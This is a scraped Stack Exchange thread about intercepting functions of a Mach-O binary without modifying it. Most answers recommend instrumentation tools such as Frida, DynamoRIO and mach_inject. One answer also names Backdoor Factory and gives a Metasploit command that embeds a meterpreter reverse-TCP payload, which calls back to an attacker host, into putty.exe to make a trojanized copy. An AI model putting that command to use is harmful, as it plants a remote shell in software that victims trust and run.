{
    "title": "Can one modify a program by \"wrapping\" its binary? What tools exist?",
    "link": "https://reverseengineering.stackexchange.com/questions/8018/can-one-modify-a-program-by-wrapping-its-binary-what-tools-exist",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  (This question is related to\n  <a href=\"https://reverseengineering.stackexchange.com/q/185\">\n   How do I add functionality to an existing binary executable?\n  </a>\n  ).\n </p>\n <p>\n  I too would like to add functionality to an existing application, but I do not want to modify the original binary.\n </p>\n <p>\n  I imagine that, for some \"well-behaved\" compiled code, it ought to be possible to create a \"wrapper\" program that:\n </p>\n <ol>\n  <li>\n   maps the original binary's segments into its own memory space; and\n  </li>\n  <li>\n   places its own redefined functions at the relevant addresses.\n  </li>\n </ol>\n <p>\n  For example, suppose that loading the original binary would place\n  <code>\n   void origfunction(int, int)\n  </code>\n  at location\n  <code>\n   0x1234\n  </code>\n  ; my thought is that loading the wrapper might cause that function's machine code (from the original binary) to be loaded at\n  <code>\n   0x5678\n  </code>\n  with\n  <code>\n   void newfunction(int, int)\n  </code>\n  loaded at\n  <code>\n   0x1234\n  </code>\n  in its place.\n  <code>\n   newfunction\n  </code>\n  could then make a call to\n  <code>\n   origfunction\n  </code>\n  before/after performing its modifications.\n </p>\n <p>\n  <strong>\n   Is this approach feasible?  If not, why not?\n  </strong>\n </p>\n <p>\n  If it is feasible, are there any tools that can assist in automating the generation of such a wrapper program?  Generic answers would be most useful for future readers, but the original binary that I am working with right now is a fairly typical OS X one (Mach-O format, compiled from Objective-C).\n </p>\n</div>\n</body></html>",
    "votes": "2",
    "answers": 2,
    "views": "1k",
    "tags": [
        "tools",
        "c",
        "executable",
        "osx",
        "mach-o"
    ],
    "user": "eggyal",
    "time": "Apr 13, 2017 at 12:49",
    "comments": [],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Dynamic instrumentation tools like\n  <a href=\"https://www.frida.re/docs/installation/\" rel=\"nofollow noreferrer\">\n   Frida\n  </a>\n  or\n  <a href=\"http://www.dynamorio.org/\" rel=\"nofollow noreferrer\">\n   DynomoRIO\n  </a>\n  are probably your best bet. Traditional code injection approaches like\n  <a href=\"https://github.com/rentzsch/mach_inject\" rel=\"nofollow noreferrer\">\n   mach_inject\n  </a>\n  on os x or\n  <a href=\"http://research.microsoft.com/en-us/projects/detours/\" rel=\"nofollow noreferrer\">\n   detours\n  </a>\n  on windows are things you could look into as well.\n </p>\n</div>\n</body></html>",
            "votes": "3",
            "user": "broadway",
            "time": "Jan 27, 2017 at 18:38",
            "is_accepted": false,
            "comments": [
                {
                    "user": "ikaerom",
                    "text": "<span class=\"comment-copy\">I suppose mentioning <b>pin</b> (which does not seem to be available anymore on MacOSX) and <b>DynomoRIO</b>, one could also add <a href=\"http://www.cycript.org/\" rel=\"nofollow noreferrer\">cycript</a> to that list. It works remarkably well, though seems mostly undocumented.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Some of the tools i know of:\n </p>\n <ol>\n  <li>\n   <p>\n    Backdoor Factory:\n    <a href=\"https://github.com/secretsquirrel/the-backdoor-factory\" rel=\"nofollow\">\n     https://github.com/secretsquirrel/the-backdoor-factory\n    </a>\n   </p>\n  </li>\n  <li>\n   <p>\n    Use Metasploit msfencode:\n   </p>\n   <p>\n    <code>\n     msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 3 -t exe -x /var/www/putty.exe -o /var/www/puttyx.exe\n    </code>\n   </p>\n  </li>\n </ol>\n <p>\n  Backdoor Factory support a varity of binaries such as ELF, Mach-O, PE.\n </p>\n</div>\n</body></html>",
            "votes": "1",
            "user": "Jonas Lejon",
            "time": "Jan 15, 2015 at 10:33",
            "is_accepted": false,
            "comments": [
                {
                    "user": "eggyal",
                    "text": "<span class=\"comment-copy\">Unless I've misunderstood, both those solutions appear to <i>statically</i> modify the underlying binary (which is something that I do not want to do).  I am looking for tools through which one can create an executable that will <i>dynamically</i> load the original binary yet intercept its function calls.  Or have I missed something?</span>",
                    "time": null
                },
                {
                    "user": "Jonas Lejon",
                    "text": "<span class=\"comment-copy\">@eggyal: You are correct. I misunderstood the question, sorry.</span>",
                    "time": null
                }
            ]
        }
    ]
}